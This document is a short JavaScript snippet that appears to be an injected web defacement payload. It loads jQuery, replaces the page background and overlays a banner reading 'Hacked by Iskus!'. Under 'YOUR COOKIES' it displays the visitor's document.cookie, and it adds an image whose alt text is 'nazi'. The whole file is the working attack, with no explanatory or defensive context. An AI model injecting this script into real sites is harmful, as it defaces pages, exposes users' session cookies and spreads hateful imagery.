var script = document.createElement('script');
script.src = 'http://code.jquery.com/jquery-1.7.2.min.js';
document.getElementsByTagName('head')[0].appendChild(script);
script.onload = function () {
   $(document).ready(function () {
       $('body').attr('style',"background:url(http://gruz.loc/images/bg4.gif)")
           .append(
           $('<div ' +
           'style=' +
           '"z-index:10000;position:fixed;' +
           'left:50%;min-height:200px;padding:20px;' +
           'border:10px outset rgba(19,193,236,0.51);' +
           'background:url(http://gruz.loc/images/bg4.gif); ' +
           'box-shadow: 22px 28px 28px black,-15px -15px 29px rgba(128, 189, 224, 0.57);' +
           'text-align:center;width:900px;margin-left:-450px;top:25%;color:red;"></div>')
               .html('<span id="ht" style="color:#000;display block;font-size:39px;margin:20px auto;text-shadow:-2px -2px 5px #FCFCFC, 0px 0px 29px rgba(0, 194, 255, 0.98), 1px 1px 9px #EAF4F7, 7px 7px 0px black;width: 250px;"><b>Hacked by Iskus!</b><br/></span>'));
       $('#ht').append('<span style="width:400px; text-align:left;display:block;font-size:16px;margin:40px 5px;"><b>YOUR COOKIES:</b><br/>' + document.cookie + '</span>');
       $('body').append('<div style="z-index:10001;position:fixed;top:35%;left:60%;box-shadow:13px 5px 5px rgba(97,158,199,0.54) inset;border-radius:230px;width:400px;height:400px;">' +
       '<img src="http://gruz.loc/images/logo.png" alt="nazi" /></div>')
   })}